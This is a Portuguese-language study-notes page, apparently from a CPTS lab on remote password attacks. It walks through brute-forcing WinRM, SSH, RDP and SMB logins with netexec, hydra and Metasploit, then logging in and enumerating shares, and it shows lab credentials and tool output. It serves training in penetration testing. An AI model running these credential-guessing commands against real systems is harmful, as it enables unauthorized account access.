> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/remote-password-attacks/questions.md).

# Questions

1. Localize o usuário do serviço WinRM e descubra a senha dele. Depois, ao fazer login, você encontrará a flag em um arquivo. Envie a flag encontrada como resposta.

* Quebra de senha com o `netexec`

```
 netexec winrm $myip -u username.list -p password.list 
```

* Usar a ferramenta evil-winrm para estabelecer uma sessão do Powershell

```
evil-winrm -i $myip -u john -p "november"
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FPwJtbf9fPMN2FQ08FOTX%2Fimage.png?alt=media&amp;token=7fa5794b-d6fa-4d4c-a5e9-1bcf68b4b6fc" alt=""><figcaption></figcaption></figure>

***

2. Encontre o usuário do serviço SSH e descubra a senha dele. Depois, ao fazer login, você encontrará a flag em um arquivo. Envie a flag encontrada como resposta.

* Quebra de senha com a ferramenta hydra

```
hydra -L username.list -P password.list ssh://$myip
```

* Em seguida, devemos fazer login via ssh

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FuGQ1ZDZ8NyI5gjncHqGb%2Fimage.png?alt=media&amp;token=1e2275f7-b5b7-40b6-8ebd-bee487c13ecd" alt=""><figcaption></figcaption></figure>

***

3. Localize o usuário do serviço RDP e descubra a senha dele. Depois, ao fazer login, você encontrará a flag em um arquivo. Envie a flag encontrada como resposta.

* Quebra de senha com a ferramenta `netexec`

```
netexec rdp $myip -u username.list -p password.list
```

* Em seguida, devemos fazer login com a ferramenta `remmina`

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FSENPhHpwTOO1JzwdhCYJ%2Fimage.png?alt=media&amp;token=3f73c6d9-6917-4d56-8290-040cc543353b" alt=""><figcaption></figcaption></figure>

***

4. Localize o usuário do serviço SMB e descubra a senha dele. Depois, ao fazer login, você encontrará a flag em um arquivo. Envie a flag encontrada como resposta.

* Quebrar a senha com o modulo `scanner/smb/smb_login` no metasploit&#x20;
* Enumeração de compartilhamento, com a ferramenta `netexec`&#x20;

```
netexec smb 10.129.13.232 -u "cassie" -p "12345678910" --shares

SMB         10.129.13.232   445    WINSRV           [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.13.232   445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.13.232   445    WINSRV           [*] Enumerated shares
SMB         10.129.13.232   445    WINSRV           Share           Permissions     Remark
SMB         10.129.13.232   445    WINSRV           -----           -----------     ------
SMB         10.129.13.232   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.13.232   445    WINSRV           C$                              Default share
SMB         10.129.13.232   445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.13.232   445    WINSRV           IPC$            READ            Remote IPC

```

* Conectar-se ao compartilhado&#x20;

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FS8bcvdZuGZwG4D3SxcxP%2FCaptura%20de%20tela%202026-02-19%20191105.png?alt=media&amp;token=a9f57f98-8665-4480-8328-f4f8665e2338" alt=""><figcaption></figcaption></figure>
